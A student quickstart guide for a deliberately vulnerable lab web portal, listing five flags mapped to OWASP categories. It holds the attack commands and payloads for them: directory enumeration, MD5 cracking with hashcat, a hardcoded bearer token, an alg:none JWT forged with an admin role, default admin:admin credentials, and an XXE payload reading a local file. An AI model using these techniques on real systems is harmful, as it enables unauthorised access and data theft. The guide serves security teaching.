# Lab 02 Student Quickstart Guide

## Portal URL
```
http://<VM_IP>:80   or   http://vaulttech.local:80
```

## VM Login
```
Username: student   |   Password: (given by instructor)
```

---

## The 5 Flags

| # | Flag | Where / How | OWASP |
|---|------|-------------|-------|
| 1 | `WEAKHASH` | Crack MD5 in `/backup/users.db.sql` → login as admin | A02 |
| 2 | `HARDCODED` | Read `assets/js/portal.js` → use token on `/internal_api.php` | A02 |
| 3 | `JWT` | Forge JWT with `alg:none` on `/jwt_portal.php` | A02 |
| 4 | `MISCONFIG` | Gobuster finds `/admin/` → default creds `admin:admin` | A05 |
| 5 | `VULNCOMP` | XXE inject into `POST /api/v1/parse.php` | A06 |

---

## Essential Commands

```bash
# 1. Directory enumeration
gobuster dir -u http://<IP>:80 -w /usr/share/wordlists/dirb/common.txt

# 2. Crack MD5 hash (found in /backup/users.db.sql)
echo "<md5_hash>" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# 3. Read JavaScript source
curl http://<IP>:80/assets/js/portal.js | grep TOKEN

# 4. Call internal API with hardcoded token
curl -H "Authorization: Bearer <token>" http://<IP>:80/internal_api.php

# 5. Forge JWT with alg:none (manual base64url encode)
# header:  {"alg":"none","typ":"JWT"}
# payload: {"sub":"employee1","role":"admin","iat":1700000000}
# token:   <b64(header)>.<b64(payload)>.   (trailing dot, no signature)

# 6. XXE injection
curl -X POST http://<IP>:80/api/v1/parse.php \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/lab_vulncomp_flag">]>
<request><data>&xxe;</data></request>'
```

---

## Where to Start

1. **Browse** every linked page, note URL structure and loaded JS files
2. **Gobuster** — discover `/backup/`, `/admin/`, `/api/` directories
3. **View Source** — read `assets/js/portal.js` carefully
4. **Check `/backup/`** — directory listing is enabled, download the SQL dump
5. **Try default creds** — when you find a login form, `admin:admin` first

---
Good luck! 🎯
